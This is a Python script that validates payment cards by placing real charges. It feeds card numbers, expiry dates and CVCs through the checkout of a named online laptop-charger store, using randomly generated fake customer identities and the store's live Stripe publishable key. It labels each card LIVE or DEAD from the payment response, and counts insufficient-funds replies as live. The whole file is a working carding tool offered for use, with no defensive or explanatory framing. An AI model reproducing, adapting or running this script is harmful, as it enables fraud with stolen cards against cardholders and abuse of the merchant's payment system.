#!/usr/bin/env python3
import requests
import random
import string
import sys
import json
import re
import time

s = requests.Session()

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khalid", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", 
                   "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", 
                   "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", 
                   "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", 
                   "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", 
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", 
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", 
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", 
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
                   
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", 
                  "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", 
                  "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", 
                  "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", 
                  "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", 
                  "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", 
                  "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", 
                  "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", 
                  "Watson", "Webb", "White", "Young"]
    
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def check_charge(card):
    try:
        n, mm, yy, cvc = card.split('|')
        
        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            full_yy = f'20{yy}'
        else:
            full_yy = yy
        
        # Generate user data
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        
        # Step 1: Add to cart
        headers1 = {
            'authority': 'www.laptopchargerfactory.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.laptopchargerfactory.com',
            'referer': 'https://www.laptopchargerfactory.com/microsoft-charger/any-microsoft-surface-charger-power-adapter',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        cart_data = {
            'option[3993758]': '5 Pin Tip',
            'option[3993776]': '9866054',
            'option[3993755]': '9866009',
            'option[3993756]': '9866013',
            'quantity': '1',
            'product_id': '1254844'
        }
        
        s.post('https://www.laptopchargerfactory.com/index.php?route=checkout/cart/add', headers=headers1, data=cart_data, timeout=15)
        
        # Step 2: Go to checkout
        headers2 = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        s.get('https://www.laptopchargerfactory.com/checkout', headers=headers2, timeout=15)
        
        # Step 3: Validate checkout
        headers3 = {
            'authority': 'www.laptopchargerfactory.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.laptopchargerfactory.com',
            'referer': 'https://www.laptopchargerfactory.com/checkout',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        validate_data = [
            ('scompany', 'waysss'),
            ('sfirstname', first_name),
            ('slastname', 'steer 62888'),
            ('saddress_1', 'street 7727'),
            ('saddress_2', ''),
            ('scity', 'hudson'),
            ('szone_id', '3655'),
            ('spostcode', '10080'),
            ('scountry_id', '223'),
            ('stelephone', '15068596852'),
            ('semail', generate_random_email()),
            ('', '$29.99'),
            ('company', 'waysss'),
            ('firstname', last_name),
            ('lastname', 'steer 62888'),
            ('address_1', 'street 7727'),
            ('address_2', ''),
            ('city', 'hudson'),
            ('zone_id', '3655'),
            ('postcode', '10080'),
            ('country_id', '223'),
            ('telephone', '15068596852'),
            ('email', generate_random_email()),
            ('payment_method', 'pp_pro_pf'),
            ('cc_owner', 'ksksks ksksks'),
            ('chkterms', 'on'),
            ('', 'stripe')
        ]
        
        s.post('https://www.laptopchargerfactory.com/index.php?route=checkout/post/validate', headers=headers3, data=validate_data, timeout=15)
        
        # Step 4: Create Stripe token
        stripe_data = f'time_on_page=277252&pasted_fields=number&guid=4b54bdbb-bdfb-456b-93f5-155f43d8dbf50f985d&muid=e5b37f23-6f79-4995-b958-bf3dcd28843ea77da4&sid=8b3809d9-5573-4042-89f0-2f0097ef0fe3f3be46&key=pk_live_51IER9eAPPLyU2PMNEMJmW69EUtww0Hd97Kk0DR5ZVF8Wml9DBiPTnTE6Etnse7Gw5lFb9n1yObEH2f63vMGwnUDw00B7Zbi3EY&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={full_yy}'
        
        headers4 = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        
        token_response = s.post('https://api.stripe.com/v1/tokens', headers=headers4, data=stripe_data, timeout=15)
        token_json = token_response.json()
        
        if 'id' not in token_json:
            error_msg = token_json.get('error', {}).get('message', 'Stripe token error')
            return {"status": "DEAD", "msg": error_msg}
        
        pm = token_json['id']
        
        # Step 5: Process payment
        payment_data = {
            'cc_owner': 'ksksks ksksks',
            'stripe_token': pm
        }
        
        payment_response = s.post('https://www.laptopchargerfactory.com/index.php?route=payment/stripe/send', headers=headers3, data=payment_data, timeout=15)
        response_text = payment_response.text
        
        # Check result
        if 'success' in response_text.lower() or 'approved' in response_text.lower() or 'true' in response_text.lower() or 'completed' in response_text.lower():
            return {"status": "LIVE", "msg": "Approved"}
        elif 'Your card was declined' in response_text:
            return {"status": "DEAD", "msg": "Card declined"}
        elif 'insufficient funds' in response_text.lower():
            return {"status": "LIVE", "msg": "Insufficient funds"}
        else:
            return {"status": "DEAD", "msg": "Payment failed"}
            
    except Exception as e:
        return {"status": "DEAD", "msg": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"status": "DEAD", "msg": "No card provided"}))
        sys.exit(1)
    
    card = sys.argv[1]
    result = check_charge(card)
    print(json.dumps(result))
